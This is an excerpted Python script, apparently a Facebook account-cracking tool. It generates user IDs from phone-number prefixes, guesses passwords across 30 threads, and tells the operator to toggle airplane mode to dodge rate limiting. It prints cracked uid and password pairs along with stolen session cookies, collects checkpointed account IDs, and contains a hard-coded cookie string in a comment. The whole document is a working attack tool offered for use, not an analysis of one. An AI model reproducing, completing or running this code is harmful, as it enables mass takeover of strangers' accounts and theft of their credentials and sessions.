...
cps = []
try:
    print('\n\033[1;37m[•] WAIT SOMETIMES CHECKING FOR your approval')
...
def ali_khan():
	...
	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR  CODE : ')
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [50000]')
	lines()
...
def ff():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('\x1b[1;37m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=mYUCZqRwTQWY_pDYDbiFGGEz; sb=mYUCZpgSKnd44_BVybgF1sgU; m_pixel_ratio=3; ps_l=0; ps_n=0; wd=360x648; fr=0t5q11qJWAEcw1exn..BmAoWZ..AAA.0.0.BmAoW-.AWU6M0PDgpA',
    'dpr': '3',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AHMED-OK] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍪]\033[0;97m COOKIE = \033[1;32m'+coki+  '  ''  \033[1;37m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
               # print('\033[1;33m[AHMED-CP] '+cid+' | '+ps+'\x1b[1;97m')
            #    open('AHMED-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
